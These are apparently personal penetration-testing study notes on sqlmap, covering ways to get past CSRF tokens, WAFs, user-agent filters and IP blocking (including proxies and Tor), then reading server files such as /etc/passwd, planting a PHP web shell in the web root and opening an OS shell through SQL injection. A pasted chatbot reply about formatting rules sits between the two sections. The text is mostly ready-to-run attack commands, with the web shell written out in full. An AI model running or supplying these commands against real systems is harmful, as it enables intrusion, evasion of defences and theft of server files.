## 1- Bypassing Web Application Protections
many mechanisms are incorporated into SQLMap, which can help us successfully bypass such protections.
#### Anti-CSRF Token Bypass
Use `--csrf-token` to automatically extract new tokens
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf=123" --csrf-token="csrf"
#  dont use -r req.txt as the reqesute
```
#### Unique Value Bypass
Use `--randomize` for parameters that must be unique each request
```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
```
#### Calculated Parameter Bypass
Use `--eval` to automatically recalculate dependent values (ex: MD5 hash of id)
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```
#### IP Address Concealing
Use proxies:
```bash
sqlmap -u "http://www.example.com" --proxy="socks4://177.39.187.70:33283"
# Proxy list:
sqlmap -u "http://www.example.com" --proxy-file=proxy.txt
# Use Tor:
sqlmap -u "http://www.example.com" --tor --check-tor
```
#### WAF Bypass
Skip WAF detection to reduce noise
```bash
sqlmap -u "http://www.example.com" --skip-waf
```
#### User-Agent Blacklisting Bypass
Random browser user-agent
```bash
sqlmap -u "http://www.example.com" --random-agent
```
#### Tamper Scripts
Modify payloads to evade filters
```bash
sqlmap -u "http://www.example.com" --tamper=between,randomcase
# List available tampers:
sqlmap --list-tampers
```
#### Miscellaneous Bypasses
Use chunked encoding to split payloads:
```bash
sqlmap -u "http://www.example.com" --chunked

# HTTP Parameter Pollution (HPP):
sqlmap -u "http://example.com/somepage.php?id=1" --hpp
```


---
Understood. I will follow the **exact same rules as before**:

- Only keep titles with `###`
    
- No `---` lines
    
- Very short, clean, direct notes
    
- Only relevant info
    
- Commands in **clean fenced code blocks**
    
- Remove banners, long logs, prompts, timestamps
    
- No unnecessary text or explanations
    
- Just actionable OSCP-style notes
    

Here is your cleaned notes:

---

## 2- OS Exploitation
Read & write system files + OS command execution through SQLi.
#### Check DBA Privileges
```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
  # if db admin we probable that we have file-read/write privileges.
# LOAD DATA and INSERT priv  --> read files 
# FILE  priv --> write in files
```
#### Read Local Files
```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
#### Write Local Files 
Prepare basic PHP shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Upload shell:
```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Execute commands:
curl "http://www.example.com/shell.php?cmd=whoami"
```
####  OS Command Execution
Interactive OS shell:
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
# if it fail (ex.something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique No output)

  # Specify injection technique if needed:
  sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
